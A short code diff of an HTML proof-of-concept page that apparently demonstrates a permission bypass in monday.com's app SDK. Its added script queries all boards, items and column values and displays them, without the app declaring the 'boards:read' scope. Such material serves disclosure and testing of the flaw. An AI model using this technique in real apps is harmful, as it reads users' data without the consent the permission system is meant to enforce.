@@ -4,9 +4,13 @@
   </head>
 <body>
   <script>
-      window.addEventListener("message", e => alert(JSON.stringify(e.data.data)), !1);
-      const monday = window.mondaySdk();
+    window.mondaySdk().api(`query { boards() { id name items { name column_values { title value } } } }`)
+      .then(res => {
+        const element = document.createElement('pre');
+        element.innerHTML = JSON.stringify(res.data.data, 2);
+        document.body.appendChild(element);
+      });
   </script>
-  POC
+  Get all boards data without explicitly declaring 'boards:read' permission:
 </body>
 </html>
